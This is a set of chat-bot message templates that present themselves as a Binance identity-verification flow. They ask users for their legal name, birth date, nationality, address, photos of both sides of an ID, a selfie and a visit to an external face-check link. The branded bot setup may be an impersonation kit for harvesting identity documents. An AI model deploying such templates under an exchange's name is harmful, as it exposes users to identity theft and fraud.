welcome:
👋 Welcome to Binance Identity Verification!

To use Binance services, we need to verify your identity. This takes about 5 minutes.

You'll need:
📄 A valid government-issued ID (passport, national ID, or driver's license)
📸 A clear selfie
📍 Your current residential address

Your data is encrypted and handled per our Privacy Policy.

Do you agree to proceed? (Yes / No)
collecting_name:
Great, let's start! 📝

What is your **full legal name** as it appears on your ID document?
collecting_dob:
📅 What is your **date of birth**?
(Format: YYYY-MM-DD, e.g. 1990-01-15)
collecting_nationality: 🌍 What is your **nationality / country of citizenship**?
collecting_address:
📍 What is your **current residential address**?
(Include street, city, postal code, and country)
selecting_document:
Please select your ID document type:

1️⃣ Passport
2️⃣ National ID Card
3️⃣ Driver's License

Reply with the number or name.
uploading_doc_front:
📄 Please send a clear photo of the **front** of your {document_type}.

Tips:
✅ Place on a flat, dark surface
✅ Good lighting, no shadows
✅ All 4 corners visible
✅ No glare or blur
uploading_doc_back: Now please send a clear photo of the **back** of your document.
review_confirm: Is everything correct? Reply **Confirm** to submit, or **Edit** to start over.
submitted:
✅ Your verification has been submitted!

⏳ Processing usually takes 1–3 business days.
We'll notify you when it's complete.

📋 Reference ID: **{session_id}**
approved:
🎉 Congratulations! Your identity has been verified.

You now have full access to Binance services.
cancelled:
❌ KYC cancelled. Your data has been deleted.
Type /start_kyc to start again.
session_expired: ⏰ Your session has expired. Type /start_kyc to begin again.
already_approved: ✅ Your identity is already verified! No further action needed.
error: Something went wrong. Please try again or type /cancel to start over.
cancel_confirm: Are you sure you want to cancel? All progress will be lost. (Yes / No)
help:
🔍 **Binance KYC Bot Commands**

/start_kyc — Start identity verification
/status — Check verification status
/cancel — Cancel current verification
/help — Show this message
/lang — Change language
awaiting_liveness:
Almost done! For security, we need a quick face verification.

🔗 Please open this link:
{liveness_url}

It takes about 30 seconds — just follow the on-screen instructions.
I'll wait here and get notified automatically when you're done! ⏳
